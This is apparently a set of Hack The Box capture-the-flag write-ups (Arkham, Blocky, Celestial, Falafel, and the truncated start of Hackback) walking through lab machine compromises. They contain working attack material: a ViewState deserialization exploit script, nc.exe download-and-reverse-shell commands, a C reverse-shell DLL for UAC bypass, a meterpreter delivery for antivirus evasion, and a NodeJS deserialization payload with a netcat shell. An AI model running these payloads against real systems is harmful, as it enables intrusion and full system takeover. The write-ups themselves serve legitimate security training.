 
 
 
 
 
 
Arkham 
15​th​ May 2019 / Document No D19.100.30 
Prepared By: MinatoTW 
Machine Author: MinatoTW 
Difficulty: ​Medium  
Classification: Official 
 
 
Page 1 / 22 
 
 
SYNOPSIS 
Arkham is a medium difficulty Windows box which needs knowledge about encryption, java
 
   
 
 
 
 
 
 
 
 
 
 
deserialization and Windows exploitation. A disk image present in an open share is found which
 
 
 
   
 
 
 
 
 
 
   
 
 
is a LUKS encrypted disk. The disk is cracked to obtain configuration files. The Apache MyFaces
   
 
 
 
 
   
 
 
 
 
 
 
 
 
page running on tomcat is vulnerable to deserialization but the viewstate needs to encrypted.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
After establishing a foothold an Outlook OST file is found, which contains a screenshot with a
 
   
 
 
 
 
 
 
 
 
   
 
   
password. The user is found to be in the Administrators group, and a UAC bypass can be
 
 
 
 
 
 
 
 
 
 
 
   
 
 
 
 
performed to gain a SYSTEM shell. 
 
Skills Required 
●
Enumeration 
●
Scripting 
●
Basic Cryptography 
 
Skills Learned 
●
Java Deserialization 
●
UAC bypass 
 
 
 
 
 
 
 
 
Page 2 / 22 
 
ENUMERATION 
NMAP 
ports=$(nmap -p- --min-rate=1000  -T4 10.10.10.130 | grep ^[0-9] | cut -d 
'/'​ -f 1 | tr ​'\n'​ ​','​ | sed s/,$//) 
nmap -p​$ports​ -sC -sV -T4 10.10.10.130 
 
 
 
IIS is running on port 80 along with SMB and Apache tomcat at their respective ports. 
 
 
 
 
 
 
 
Page 3 / 22 
 
SMB 
Lets use smbclient to bind with a null session to list open shares. 
smbclient -N -L  \\\\10.10.10.130 
 
 
 
We find a share named BatShare, connect to it and list the contents. 
 
smbclient -N  \\\\10.10.10.130\\BatShare 
 
 
 
As the file is large in size, we’ll mount the share and then copy the file. 
 
mount -t cifs -o rw,username=guest,password= ​'//10.10.10.130/BatShare'​ /mnt 
cp /mnt/appserver.zip . 
 
And then unzip it to view the contents. 
 
unzip appserver.zip 
 
Page 4 / 22 
 
CRACKING THE DISK IMAGE 
After extracting the zip we find a note which says the backup image is from a Linux server and a
 
 
 
 
 
   
 
 
 
 
 
   
   
 
 
   
backup image. Running "file" on the image says that it’s a LUKS encrypted disk, which is possible
 
 
 
 
 
 
 
 
 
   
 
 
 
   
 
to crack. 
 
Follow these steps to crack the disk. 
cryptsetup luksDump backup.img | grep ​"Payload offset"​ ​# Add 1 to the 
result 
dd ​if​=backup.img of=header bs=512 count=4097 
hashcat -m 14600 -a 0 -w 3 header rockyou.txt 
It could take a while to crack. Once done the password is found to be “batmanforever”. 
Now we need to open and mount the disk. 
cryptsetup luksOpen backup.img dump ​# Pass is batmanforever 
mount /dev/mapper/dump /mnt 
 
After mounting we find some images and tomcat configuration files which can be useful later. 
Page 5 / 22 
 
 
APACHE TOMCAT 
Navigating to port 8080 we find a normal blog. 
 
Most of the options seem useless however clicking on subscription takes us to another page 
http://10.10.10.130:8080/userSubscribe.faces​. 
 
The page extension suggests that it’s an Apache MyFaces installation. A google search about 
Apache MyFaces vulnerabilities shows an RCE exists in it due to insecure deserialization of JSF 
viewstates ​here​. Viewing the source of the page, we see that javax ViewState is present. 
Page 6 / 22 
 
 
EXPLOITING DESERIALIZATION 
Going back to the tomcat configuration files we found earlier it’s seen that the page uses 
encrypted viewstates from the web.xml.bak file. 
<​description​>State saving method: 'client' or 'server' (=default). See JSF 
Specification 2.5.2</​description​> 
  
<​param-name​>javax.faces.STATE_SAVING_METHOD</​param-name​> 
<​param-value​>server</​param-value​> 
</​context-param​> 
<​context-param​> 
<​param-name​>org.apache.myfaces.SECRET</​param-name​> 
<​param-value​>SnNGOTg3Ni0=</​param-value​> 
</​context-param​> 
<​context-param​> 
 
<​param-name​>org.apache.myfaces.MAC_ALGORITHM</​param-name​> 
 
<​param-value​>HmacSHA1</​param-value​> 
 
</​context-param​> 
<​context-param​> 
<​param-name​>org.apache.myfaces.MAC_SECRET</​param-name​> 
<​param-value​>SnNGOTg3Ni0=</​param-value​> 
</​context-param​> 
<​context-param​> 
<​description​> 
It’s also seen that the viewstate is saved on the server side. So, we’ll have to create a malicious 
viewstate and then encrypt it using the parameters we already have. 
CREATING SERIALIZED PAYLOAD 
Ysoserial​ is a tool used to create malicious serialized payloads. Download the jar from JitPack, 
make sure you have openjdk-8 installed. 
apt install openjdk-8-jdk 
Page 7 / 22 
 
wget 
https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-m
aster-SNAPSHOT.jar 
java -jar ysoserial-master-SNAPSHOT.jar 
We have a lot of payloads but let’s go with the common ones i.e CommonsCollections. Lets see if 
we can ping ourselves first. 
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 ​'cmd /c ping -n 
2 10.10.16.32'​ > payload.bin 
 
In order to encrypt the payload we’ll use python. The ​documentation​ says the default encoding is 
DES with PKCS5 padding if not specified. We’ll use pyDes to create the payload.  
 
pip install pyDes 
 
The following lines will encrypt our payload, 
 
key= bytes(​'SnNGOTg3Ni0='​).decode(​'base64'​) ​# The secret key 
 
obj = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5) 
enc = obj.encrypt(payload) ​# Encrypting with DES from 
https://wiki.apache.org/myfaces/Secure_Your_Application  
 
The key is from the config file we found earlier. We initialize the object with the key, ECB mode 
and PKCS5 padding and then encrypt the payload. 
 
Next we need to create the HMAC. The HMAC is used to verify the integrity of the message. It is 
calculated and appended to the message, so that it can be verified when it is received. From the 
config we know that the HMAC algorithm is SHA1 and the key is same as the encryption. 
 
hash_val = (hmac.new(key, bytes(enc), sha1).digest()) ​# Calculating hmac 
payload = enc + hash_val 
payload_b64 = base64.b64encode(payload) ​# Creating final payload 
 
The above snippet creates the SHA1 hash of the encrypted payload from earlier. Make sure to 
use raw bytes and not hexdigest. Then it is base64 encoded to be sent. 
Page 8 / 22 
 
 
 
 
 
 
Here’s the final script, 
 
#!/usr/bin/python 
 
from​ requests ​import​ post, get 
from​ bs4 ​import​ BeautifulSoup 
import​ sys 
from​ urllib ​import​ urlencode,quote_plus 
import​ pyDes 
import​ base64 
import​ hmac 
from​ hashlib ​import​ sha1 
 
url = ​'http://10.10.10.130:8080/userSubscribe.faces' 
  
def​ ​getViewState​():  ​# Finding if viewState exists or not 
  ​try​: 
 
request = get(url) 
  ​except​: 
 
print​ ​"Can't connect to the server" 
 
sys.exit() 
  soup = BeautifulSoup(request.text, ​'html.parser'​) 
  viewState = soup.find(​'input'​, id=​'javax.faces.ViewState'​)[​'value'​] 
  ​return​ viewState 
 
def​ ​getPayload​(): 
  ​# Creating a payload for commons-collections 3.1 from 
https://github.com/frohoff/ysoserial 
  payload = open(​'payload.bin'​, ​'rb'​).read() 
  ​return​ payload.strip() 
 
def​ ​exploit​(): 
  viewState = getViewState()  
  ​if​ viewState ​is​ ​None​: 
Page 9 / 22 
 
 
print​ ​"No viewState found" 
  ​else​: 
 
print​ ​"Viewstate found: {}"​.format(viewState) 
 
  payload = getPayload() 
 
  key= bytes(​'SnNGOTg3Ni0='​).decode(​'base64'​) ​# The secret key 
 
  obj = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5) 
  enc = obj.encrypt(payload) ​# Encrypting with DES from 
https://wiki.apache.org/myfaces/Secure_Your_Application 
 
  hash_val = (hmac.new(key, bytes(enc), sha1).digest()) ​# Calculating hmac 
 
  payload = enc + hash_val 
 
  payload_b64 = base64.b64encode(payload) ​# Creating final payload 
 
  ​print​ ​"\n\n\nSending encoded payload: "​+payload_b64 
 
  headers = { 
"Accept"​: 
"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"​, 
  
"Connection"​: ​"keep-alive"​, 
"User-Agent"​: ​"Tomcat RCE"​, 
"Content-Type"​: ​"application/x-www-form-urlencoded"​} 
 
  execute = {​'javax.faces.ViewState'​: payload_b64} 
  r = post(url, headers=headers, data=execute) 
 
 
if​ __name__ == ​'__main__'​: 
exploit() 
 
The getViewState function just checks if the VIewState is present or not. The getPayload function
 
 
 
 
   
 
   
 
 
 
 
 
 
reads the payload from the file we created using ysoserial. Then encryption and hmac creation
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
takes place as discussed earlier. Then the payload is sent as a POST parameter for
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
javax.faces.ViewState. 
Page 10 / 22 
 
 
Running the script we see that our ping is returned. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Page 11 / 22 
 
FOOTHOLD 
Now that we have RCE lets use nc.exe to get a shell. Start a simple HTTP server and then create 
the payload to download and execute it. 
 
java -jar ysoserial.jar CommonsCollections5 ​'powershell wget 
10.10.16.32/nc.exe -O C:\\Windows\\Temp\\pwn.exe && cmd /c 
C:\\Windows\\Temp\\pwn.exe 10.10.16.32 443 -e powershell.exe'​ > payload.bin 
python3 -m http.server ​80 
 
 
 
And we get a shell as user Alfred.  
 
 
 
 
 
 
 
 
 
Page 12 / 22 
 
 
LATERAL MOVEMENT 
ENUMERATION 
While enumerating the file system we come across a zip file in the Downloads folder of the user. 
 
Lets transfer it using the nc.exe we placed earlier. 
certutil -encode backup.zip backup.b64 
cat backup.b64 | cmd /c C:\windows\temp\pwn.exe ​10.10.16.32​ ​4444 
And locally: 
nc -lvp ​4444​ > backup.b64  #remove the certificate markers from top and 
bottom 
sed -i s/\n//g backup.b64 # remove new lines 
base64 -d backup.b64 > backup.zip 
unzip backup.zip 
 
Page 13 / 22 
 
 
Ignore the base64 error due to certutil padding. After unzipping we find the OST file. 
 
 
 
An OST file is an offline folder file for Microsoft Outlook. It’s local copy of the user’s mailbox 
which is stored in an email server such as Exchange. We can use readpst to open it up. 
 
apt install pst-utils 
readpst alfred@arkham.local.ost 
 
It finds one item in the Draft folder. 
 
 
 
It creates an mbox file which can be opened using evolution or thunderbird. 
 
apt install evolution 
evolution Drafts.mbox 
 
In there we find a screenshot containing a password from Batman. 
 
Page 14 / 22 
 
 
 
Using the credentials Batman / Zx^#QX+T!123 we can now login via WinRM. 
 
$pass​ = ​convertto-securestring​ ​'Zx^#QZX+T!123'​ -asplain -force  
$cred​ = ​new-object 
system.management.automation.pscredential(​'arkham\batman'​, ​$pass​) 
enter-pssession​ -computer arkham -credential ​$cred  
 
 
 
 
And we are Batman! 
 
 
 
 
 
 
 
 
 
 
 
 
 
Page 15 / 22 
 
PRIVILEGE ESCALATION 
ENUMERATION 
We look at the user’s groups and find that he’s in the Administrators group. 
 
So we’ll have to stage a UAC bypass to get a SYSTEM shell. Looking at systeminfo we see that 
the OS is Windows server 19. 
There can be many ways to do a UAC bypass but there’s one specific to Server 19 and more
 
 
 
 
 
 
   
 
 
 
 
 
 
 
 
 
 
 
guaranteed to work. According to ​https://egre55.github.io/system-properties-uac-bypass/ we can
 
 
 
 
 
 
 
 
bypass UAC through DLL hijacking via SystemPropertiesAdvanced.exe as it auto-elevates. 
But as SystemPropertiesAdvanced is a GUI app we’ll need to be in session 1 to execute it as
 
 
 
   
 
 
 
 
 
 
 
   
 
   
 
PSRemoting uses session 0. So, we’ll get a meterpreter and migrate to a process in session 1. 
 
 
Page 16 / 22 
 
GETTING A METERPRETER 
We’ll use ​GreatSCT​ to get a meterpreter as we need to bypass AV. 
git clone https://github.com/GreatSCT/GreatSCT 
cd GreatSCT/setup 
sudo ./setup.sh -c  
cd .. 
./GreatSCT.py 
 
Lets create a msbuild/meterpreter/rev_tcp.py payload as it’ll be easy to evade. 
 
use ​1 
list 
use ​9 
set lhost ​10.10​.​16.32 
generate 
 
 
 
Copy the payload.xml and start msf using the payload.rc file. 
 
msfconsole -r /usr/share/greatsct-output/handlers/payload.rc 
 
Download the xml file onto the target and execute it using msbuild. 
 
powershell wget ​10.10​.​16.32​/payload.xml -O payload.xml 
cmd /c C:\Windows\Microsoft.NET\Framework\v4.​0.30319​\msbuild.exe 
payload.xml 
 
The process should hang and we should get a session. 
 
Page 17 / 22 
 
 
 
 
Now we need to migrate to a process in session 1. List all the processes using ps. 
 
 
 
We see a svchost.exe process running as batman in session 1. Lets migrate to it. 
 
 
 
Note: Incase the migration fails kill the session and try again. It might take 4 -5 attempts to 
succeed. 
 
DLL HIJACKING 
Now that we have a shell in session 1 we just need to create a malicious DLL and place it in the 
WindowsApps folder to get it executed. Here’s a sample DLL, 
#include ​<winsock2.h> 
#include ​<windows.h> 
#include ​<stdio.h> 
#include ​<ws2tcpip.h> 
 
#define DEFAULT_BUFLEN 1024 
  
void​ ​ExecutePayload​(​void​); 
Page 18 / 22 
 
  
 
BOOL WINAPI 
DllMain​ (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) 
{ 
switch​ (dwReason) 
{ 
 
case​ DLL_PROCESS_ATTACH: 
 
ExecutePayload(); 
 
break​; 
 
 
case​ DLL_PROCESS_DETACH: 
 
// Code to run when the DLL is freed 
 
break​; 
 
 
case​ DLL_THREAD_ATTACH: 
 
// Code to run when a thread is created during the DLL's 
lifetime 
 
 
break​; 
  
 
 
case​ DLL_THREAD_DETACH: 
 
// Code to run when a thread ends normally. 
 
break​; 
  
} 
return​ TRUE; 
} 
  
 
void​ ​ExecutePayload​(​void​) { 
 
Sleep(​1000​);
// 1000 = One Second 
 
 
SOCKET mySocket; 
 
sockaddr_in addr; 
 
WSADATA version; 
 
WSAStartup(MAKEWORD(​2​,​2​), &version); 
 
mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, ​NULL​, (​unsigned 
int​)​NULL​, (​unsigned​ ​int​)​NULL​); 
  
Page 19 / 22 
 
 
addr.sin_family = AF_INET; 
 
 
addr.sin_addr.s_addr = inet_addr(​"10.10.16.32"​); 
addr.sin_port = htons(​4443​); 
 
//Connecting to Proxy/ProxyIP/C2Host 
 
if​ (WSAConnect(mySocket, (SOCKADDR*)&addr, ​sizeof​(addr), ​NULL​, ​NULL​, 
NULL​, ​NULL​)==SOCKET_ERROR) { 
  
 
closesocket(mySocket); 
 
WSACleanup(); 
 
} 
 
else​ { 
 
char​ RecvData[DEFAULT_BUFLEN]; 
 
memset​(RecvData, ​0​, ​sizeof​(RecvData)); 
 
int​ RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, ​0​); 
 
if​ (RecvCode <= ​0​) { 
 
closesocket(mySocket); 
 
WSACleanup(); 
 
} 
 
else​ { 
 
char​ Process[] = ​"cmd.exe"​; 
 
STARTUPINFO sinfo; 
 
PROCESS_INFORMATION pinfo; 
 
memset​(&sinfo, ​0​, ​sizeof​(sinfo)); 
 
sinfo.cb = ​sizeof​(sinfo); 
 
sinfo.dwFlags = (STARTF_USESTDHANDLES | 
STARTF_USESHOWWINDOW); 
  
 
sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = 
(HANDLE) mySocket; 
  
 
CreateProcess(​NULL​, Process, ​NULL​, ​NULL​, TRUE, ​0​, ​NULL​, 
NULL​, &sinfo, &pinfo); 
  
 
WaitForSingleObject(pinfo.hProcess, INFINITE); 
 
CloseHandle(pinfo.hProcess); 
 
CloseHandle(pinfo.hThread); 
 
 
memset​(RecvData, ​0​, ​sizeof​(RecvData)); 
 
int​ RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 
Page 20 / 22 
 
0​); 
  
 
if​ (RecvCode <= ​0​) { 
 
closesocket(mySocket); 
 
WSACleanup(); 
 
} 
 
if​ (​strcmp​(RecvData, ​"exit\n"​) == ​0​) { 
 
exit​(​0​); 
 
} 
 
} 
 
} 
} 
The DLL uses raw sockets to execute commands with cmd.exe and uses the sockets file 
descriptors to send output and get input. 
Compile it using mingw to a 32 bit DLL named srrstr.dll as that’s what the binary looks for. 
apt install mingw-64 
i686-w64-mingw32-g++ pwn.cpp -lws2_32 -o srrstr.dll -shared 
 
When done upload it to the windowsapps folder as suggested by the article. 
cd​ C:\Users\Batman\AppData\Local\Microsoft\WindowsApps 
upload srrstr.dll 
 
Once uploaded execute the binary C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe or 
any other SystemProperties* binary. 
cmd /c C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe 
Page 21 / 22 
 
 
We get a shell as batman, but however we have more privileges now. 
 
And we can move into the Administrator folder to read the flag. 
 
 
Page 22 / 22 
 
 
 
 
 
 
Blocky 
5​th​ October 2017 / Document No D17.100.07 
Prepared By: Alexander Reid (Arrexel) 
Machine Author: Arrexel 
Difficulty: ​Easy 
Classification: Official 
 
 
Page 1 / 6 
 
 
 
 
SYNOPSIS 
Blocky is fairly simple overall, and was based on a real-world machine. It demonstrates the risks 
of bad password practices as well as exposing internal files on a public facing system. On top of 
this, it exposes a massive potential attack vector: Minecraft. Tens of thousands of servers exist 
that are publicly accessible, with the vast majority being set up and configured by young and 
inexperienced system administrators. 
 
Skills Required 
●
Basic knowledge of Linux 
●
Enumerating ports and services 
 
Skills Learned 
●
Exploiting bad password practices 
●
Decompiling JAR files 
●
Basic local Linux enumeration 
 
Page 2 / 6 
 
Enumeration 
Nmap 
 
There are quite a few open services. ProFTPD, OpenSSH, Apache, Minecraft and an 
unresponsive service on 8192 (which just happens to be the standard Minecraft Votifier port). 
 
 
 
 
 
 
Page 3 / 6 
 
Dirbuster 
 
After a bit of trial and error, it is clear that fuzzing a Wordpress website presents a few challenges 
for recursive and PHP file fuzzing. Using the Dirbuster lowercase medium wordlist and only 
fuzzing for directories discovers a ​plugins​ directory, which is not to be confused with the official 
Wordpress ​wp-content/plugins​ directory. A quick peek inside reveals some jar files, which 
Minecraft uses to add additional features to a server. 
 
Page 4 / 6 
 
Exploitation 
Looking at the jar files, griefprevention is an open source plugin that is freely available. 
BlockyCore, however, appears to be created by the server administrator, as its title relates 
directly to the server. Decompiling with JD-GUI exposes the credentials for the root MySQL user. 
 
While possible to login to PHPMyAdmin with these credentials, it is not the intended method for 
initial access. The PHPMyAdmin route is far more complex, and involves changing the Wordpress 
administrator password, creating a reverse PHP shell and escalating from the www-data user via 
the DCCP Double-Free technique (​CVE-2017-6074​). 
The intended method for this machine is a simple username and password reuse. Attempting to 
connect via SSH to the ​notch​ user (username discovered in the Wordpress post) and supplying 
the MySQL root password gives immediate access. 
 
Page 5 / 6 
 
Privilege Escalation 
LinEnum: ​https://github.com/rebootuser/LinEnum 
After obtaining the user flag from ​/home/notch/user.txt​, running LinEnum gives a very long list of 
data. Refer to ​linenum_blocky.txt​ to view the full report. At first glance, the method to obtain the 
root flag is quite obvious; notch is part of the sudoers group. Simply ​sudo -i ​for a full root shell, 
and grab the root flag from ​/root/root.txt 
 
 
Page 6 / 6 
 
 
 
 
 
 
Celestial 
25​th​ August 2018 / Document No D18.100.15 
Prepared By: Alexander Reid (Arrexel) 
Machine Author: 3ndG4me 
Difficulty: ​Medium 
Classification: Official 
 
 
Page 1 / 5 
 
 
 
 
SYNOPSIS 
Celestial is a medium difficulty machine which focuses on deserialization exploits. It is not the 
most realistic, however it provides a practical example of abusing client-size serialized objects in 
NodeJS framework. 
 
Skills Required 
●
Basic/intermediate knowledge of Linux 
●
Basic/intermediate knowledge of 
Javascript 
●
Understanding of object serialization 
 
Skills Learned 
●
Exploiting object deserialization in 
NodeJS 
●
Enumerating system log files 
Page 2 / 5 
 
Enumeration 
Nmap 
 
Nmap finds on Node.js running on port 3000. 
 
 
 
 
 
Page 3 / 5 
 
Exploitation 
NodeJS Deserialization 
Viewing the NodeJS server in a browser presents a 404, however after refreshing the page, 
some text is displayed. Looking at cookies reveals a ​profile​ entry, which is a base64-encoded 
JSON string. Attempting to change the ​num​ value to an unquoted string will cause an error which 
reveals some key information. 
 
The username is ​sun​ and the data appears to be unserialized. A quick search finds several 
guides on building a serialized payload for code execution through NodeJS. In this case, an exec 
function can be passed as the username and it will be executed. 
{"username":"_$$ND_FUNC$$_require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat 
/tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 1234 >/tmp/f', function(error, stdout, stderr) { 
console.log(stdout) })","country":"Lameville","city":"Lametown","num":"2"} 
 
 
 
Page 4 / 5 
 
Privilege Escalation 
Root 
As the ​sun​ user is part of the admin group, it has access to read most log files. Looking at 
/var/www/syslog​ reveals a root cronjob which executes ​/home/sun/Documents/script.py ​every 
5 minutes. 
 
As the script is owned by the current user, modifying the script to create a reverse shell is all that 
is needed for escalation. 
 
 
Page 5 / 5 
 
 
 
 
 
 
Falafel 
23​rd​ June 2018 / Document No D18.100.08 
Prepared By: Alexander Reid (Arrexel) 
Machine Authors: dm0n & Stylish 
Difficulty: ​Hard 
Classification: Official 
 
 
Page 1 / 9 
 
 
 
 
SYNOPSIS 
Falafel is not overly challenging, however it requires several unique tricks and techniques in 
order to successfully exploit. Numerous hints are provided, although proper enumeration is 
needed to find them. 
 
Skills Required 
●
Basic/intermediate knowledge of SQL 
injection techniques 
●
Intermediate/advanced knowledge of 
Linux 
 
Skills Learned 
●
Boolean-based SQL injection 
●
Exploiting system file name restrictions 
●
Exploiting video group permissions 
●
Exploiting disk group permissions 
Page 2 / 9 
 
Enumeration 
Nmap 
 
Nmap reveals OpenSSH and Apache. Judging by the OpenSSH or Apache versions, it is likely 
running Ubuntu Xenial Xerus. 
 
 
 
 
 
Page 3 / 9 
 
Dirbuster 
 
Dirbuster finds a fairly substantial amount of files. If fuzzing for ​txt​ files, an extra hint can be 
obtained from the file ​cyberlaw.txt​, which exposes the username ​chris​. 
 
 
 
 
 
 
Page 4 / 9 
 
Exploitation 
SQL Injection & PHP Type Juggling 
The login page can be exploited with a boolean-based SQL injection. SQLMap is very useful, 
however the --string flag must be specified for it to be successful. The command ​sqlmap -r 
login.req --level=5 --risk=3 --string="Wrong identification" --technique=B -T users -D falafel 
--dump​ will dump the users table, where ​login.req​ is a file containing an intercepted login POST 
request. 
 
The ​chris​ user’s password is a hint that type juggling can be used. As the admin hash begins with 
0e​, any other hash which also begins with ​0e​ and is followed by all integers will be valid if a basic 
== comparison is used. This is due to PHP converting both hashes to floats with a value of 0. A 
quick search finds several options, with​ 240610708​ hashing to 
0e462097431906509019562988736854 ​as an example. 
 
Page 5 / 9 
 
File Upload 
When attempting to upload a file with a name longer than 236 chars, a message is returned 
revealing that the file name has been changed. By creating a PHP file named A*232 followed by 
.php.gif, the machine will cut off the .gif extension, leaving only A*232.php and allowing for code 
execution. 
 
 
 
 
 
 
 
 
 
 
Page 6 / 9 
 
Privilege Escalation 
Moshe 
The credentials for the ​moshe​ user can be easily found in ​/var/www/html/connection.php​. 
Re-using the database password with su or attempting to SSH as moshe will succeed. 
 
 
 
 
Page 7 / 9 
 
Yossi 
Some basic enumeration reveals that moshe is part of the ​video​ group, which has read access to 
video devices. A script such as LinEnum will also find that yossi is currently in an active TTY 
session, so it can be assumed that a screenshot is required to progress. 
Copying the contents of ​/dev/fb0​ and attempting to open it with Gimp/Photoshop/etc reveals 
seemingly useless image data. As the image processing program does not know the correct 
resolution, it must be supplied before it will render correctly. The actual resolution can be 
obtained from ​/sys/class/graphics/fb0/virtual_size​.  
 
The password ​MoshePlzStopHackingMe!​ can be used to SSH in directly as yossi. 
 
 
 
 
 
Page 8 / 9 
 
Root 
As yossi, checking the user groups again finds something interesting. As part of the ​disk​ group, 
yossi has full access to partitions mounted in /dev. Using​ debugfs /dev/sda1​, it is possible to read 
the root flag as well as root’s SSH priavte key. 
 
Page 9 / 9 
 
 
 
 
 
 
Hackback 
29​th​ May 2019 / Document No D19.100.27 
Prepared By: MinatoTW 
Machine Author: decoder & yuntao 
Difficulty: Insane 
Classification: Official 
 
 
Page 1 / 46 
 
SYNOPSIS 
Hackback is an insane difficulty Windows box with some good techniques at play. A GoPhish
 
 
 
 
 
 
 
 
 
 
 
 
   
 
website is discovered which leads us to some phishing vhosts. While fuzzing for files a javascript
   
 
 
 
 
 
 
 
 
 
 
 
   
 
file is discovered which is rot13 encoded. It contains sensitive information about an admin page
 
 
 
   
 
   
 
 
 
 
 
 
 
which leads to RCE vulnerability. PHP disabled_functions are in effect, and so ASPX code is used
 
 
 
 
 
 
 
   
 
 
 
 
   
 
to tunnel and bypass the firewall. 
 
Enumeration of the file system leads to a code injection vulnerability in a configuration file, from
 
 
 
 
 
 
   
 
 
 
   
 
 
 
which named pipe impersonation can be performed. Enumeration reveals that the user has
 
 
 
 
 
 
 
 
 
 
 
 
 
permissions on a service, which allows for arbitrary writes to the file system. This is exploited to
 
   
 
 
 
 
 
 
 
 
 
 
   
 
 
copy a DLL to System32, and triggering it using the DiagHub service to gain a SYSTEM shell. 
 
Skills Required 
●
Enumeration 
●
Reverse Engineering 
●
Modifying exploit code 
 
Skills Learned 
●
ASPX tunneling
 
●
Named pipe impersonation 
●
Exploiting arbitrary writes 
 
 
 
 
 
 
 
Page 2 / 46 
 
ENUMERATION 
NMAP 
ports=$(nmap -p- --min-rate=1000  -T4 10.10.10.128 | grep ^[0-9] | cut -d 
'/'​ -f 1 | tr ​'\n'​ ​','​ | sed s/,$//) 
nmap -sC -sV -p​$ports​ 10.10.10.128 
 
 
 
IIS is running on port 80, and an unknown service is running on port 6666. Nmap guesses this to
   
 
 
 
 
 
 
 
   
 
 
 
 
 
 
 
 
be HTTPAPI, which allows HTTP 2.0 communication between applications. We’ll save it for
 
 
 
 
 
 
 
 
 
 
   
 
investigation in the later stages. Port 64831 seems to be running some HTTPS application. 
 
 
 
Page 3 / 46 
 
PORT 6666 ( HTTP2 ) 
From the nmap scan we know that port 6666 is running HTTP 2.0 API. We can use curl to request 
HTTP 2.0. Let’s try that. 
curl http://128.0.0.1:6666/ --http2 
 
 
We see that the page responds with a “Missing command” error. Let’s try using some commands
 
 
 
 
 
 
   
 
 
 
 
 
 
 
 
such as whoami. 
 
 
It responds with NT AUTHORITY\NETWORK SERVICE among other information. Let’s try using
 
 
 
 
 
 
 
 
 
 
 
 
help to see if some help menu exists. 
curl http://128.0.0.1:6666/help --http2 
 
We get a list of commands such a services, ipconfig etc.. 
 
From the info command we come to know that the server is running Windows server 19. 
 
Page 4 / 46 
 
Trying the netstat commands gives us a lot of information among which there’s information about
 
 
 
 
 
   
 
 
 
 
 
 
 
 
a service running on local port 5985 which could be WinRM. 
 
Let’s look at the services now. 
 curl  http://10.10.10.128:6666/services --http2 | less 
Among the other common services we find a strange name. 
 
This service is running as LocalSystem and isn’t a default Windows service name. Let’s save it for 
later. 
 
PORT 64831 ( GOPHISH ) 
Navigating to port 64831 we see some cryptic response. 
 
Page 5 / 46 
 
But nmap showed the page to be running HTTPS, we browse to https://10.10.10.128:64831/. 
 
 
After accepting the certificate we see a GoPhish login page. Searching for GoPhish default 
credentials we find them in the ​documentation​ as admin / gophish.  
 
  
 
Trying to log in with these credentials gets us into the admin page. 
Page 6 / 46 
 
 
 
Going through the application we find some email templates.  
 
 
Click on the edit template on the right shows the source code of the template. Here’s a snippet 
from the HackTheBox template. 
 
 
<​p​>SENDER: admin@hackthebox.htb - SUBJECT: &#39;First blood 
award&#39;&nbsp;</​p​> 
 
 <​p​>You have been awarded with the 1st blood. <​a 
href​=​"http://www.hackthebox.htb"​>Catch it now</​a​>!&nbsp; &nbsp;</​p​> 
 
 <​p​>The HTB Team.&nbsp;&nbsp;</​p​> 
 
 </​td​> 
 
 </​tr​> 
 
 <​tr​> 
 
 <​td​ ​style​=​"padding:0;padding-top:25px;font-family:'Segoe 
UI',Tahoma,Verdana,Arial,sans-serif;font-size:14px;color:#2a2a2a"​> 
 
 <​p​>&nbsp;</​p​> 
 
Page 7 / 46 
 
The templates targets a user with a mail from admin@hackthebox.htb and link leading to
 
 
 
 
 
 
 
 
 
 
 
 
 
 
http://www.hackthebox.htb. Maybe this is the vhost on the box ? Let’s confirm this by adding it to
 
 
   
 
 
 
 
   
 
 
 
 
   
 
the hosts file.  
echo​ ​'10.10.10.128       hackback.htb 
www.hackthebox.htb'​ >> /etc/hosts 
 
Now browsing to www.hackthebox.htb we see an exact copy of the HTB login page.  
 
 
Enter some credentials and submitting sends a POST request to the same page. So they must be
 
 
 
 
 
   
 
 
 
 
 
 
 
 
 
 
getting stored somewhere else. There are similar pages for paypal, facebook, twitter in their
 
 
 
 
 
 
 
 
 
 
 
 
 
 
respective vhosts. Looking at the admin template we find another vhost, 
 
 
 
Add this to the hosts file for further enumeration. 
Page 8 / 46 
 
IIS 
Browsing to port 80 we just see an image of donkey without any other helpful information. Apart 
from the phishing templates we found another Admin vhost. Let’s look at it. 
 
We see another login page and looking at the page source we find the login isn’t configured, 
there’s also a comment. 
 
This points towards a JavaScript file in the js folder. Let’s use gobuster to find the file. 
Page 9 / 46 
 
GOBUSTER 
Running gobuster on the js folder in the admin vhost with .js extension. 
gobuster -w directory-list-2.3-medium.txt -t 200 -u 
http://admin.hackback.htb/js/ -x js 
 
It straight away finds a file named private.js. Let’s inspect the file. The contents of the file is, 
<script> 
ine 
n=[​'\k57\k78\k49\k6n\k77\k72\k37\k44\k75\k73\k4s\k38\k47\k73\k4o\k76\k52\k7
7\k42\k2o\k77\k71\k33\k44\k75\k4q\k4o\k72\k77\k72\k4p\k44\k67\k63\k4s\k69\k
77\k72\k59\k31\k4o\k45\k45\k67\k47\k38\k4o\k43\k77\k71\k37\k44\k6p\k38\k4o\
k33'​,​'\k41\k63\k4s\k4q\k77\k71\k76\k44\k71\k51\k67\k43\k77\k34\k2s\k43\k74\
k32\k6r\k44\k74\k4q\k4o\k68\k5n\k63\k4o\k44\k77\k71\k54\k43\k70\k54\k73\k79
\k77\k37\k6r\k43\k68\k73\k4s\k51\k58\k4q\k4s\k35\k57\k38\k4o\k70\k44\k73\k4
s\k74\k4r\k43\k44\k44\k76\k41\k6n\k43\k67\k79\k6o\k3q'​,​'\k77\k35\k48\k44\k7
